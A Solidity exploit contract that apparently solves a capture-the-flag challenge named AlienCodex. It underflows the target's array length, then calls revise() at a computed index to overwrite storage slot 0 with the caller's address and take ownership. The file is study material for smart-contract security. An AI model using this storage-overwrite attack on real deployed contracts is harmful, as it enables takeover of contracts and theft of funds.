// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract AlienCodexAttacker {
    address public alienCodexAddress;

    constructor(address _alien) public {
        alienCodexAddress = _alien;
    }

    function exploit () external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 addr = bytes32(uint256(uint160(msg.sender)));
        IAlienCodex(alienCodexAddress).makeContact();
        IAlienCodex(alienCodexAddress).retract();
        IAlienCodex(alienCodexAddress).revise(index, addr);
    }
}